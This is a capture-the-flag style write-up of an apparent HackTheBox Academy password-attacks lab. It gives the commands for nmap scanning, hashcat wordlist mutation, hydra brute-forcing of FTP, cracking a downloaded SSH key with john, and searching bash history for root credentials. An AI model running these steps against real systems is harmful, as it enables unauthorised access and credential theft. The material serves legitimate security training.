# Password Attacks Lab - Easy  

[Password Attacks Lab - Easy](https://academy.hackthebox.com/module/147/section/1334)  

## Enumeration  

>Nmap Scans and the results:  

```
sudo nmap -p- 10.129.218.52

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```  

>NMAP version and service scan:  

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
```  

### FTP  

>FTP anonymous login fails.  


## Password Wordlists   

>[Password Mutations](https://academy.hackthebox.com/module/147/section/1391)  

>Using the wordlist resources supplied, and the `custom.rule` to create mutation list of the provide password wordlist.  

>Hashcat will apply the rules of custom.rule for each word in password.list and store the mutated version in our mut_password.list  

```
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```  

## Password Attacks  

>Targeting FTP service with `hydra` and the list of usernames and the list of passwords.  

```
hydra -L resources/demo-users.lst -P resources/demo-pass.lst ftp://10.129.218.52
```  

![Password Attacks Lab-Easy](/images/Password-Attacks-Lab-Easy.png)  

>Password brute force Results:  

```
[21][ftp] host: 10.129.218.52   login: mike   password: 7777777
```  

## Foothold  

>With the obtained username `mike` and his password of `7777777`, we target FTP.  

```
ftp 10.129.218.52
ls -al
get id_rsa
```  

>Crack the `id_rsa` password with `ssh2john id_rsa >ssh.hash`.

>Using John to rip the password from `ssh.hash`:  

```
john --wordlist=../resources/demo-pass.lst ssh.hash
```  

### SSH  

>Combine the `id_rsa` key with the password, gain access as user `mike`.

```
ssh mike@10.129.218.52 -i id_rsa
```  

## Lateral Movement

>Hunting for passwords, by checking bash history for root credentials.  

```
cat .bash_history
```  

![Password Attacks Lab-Easy2](/images/Password-Attacks-Lab-Easy2.png)  
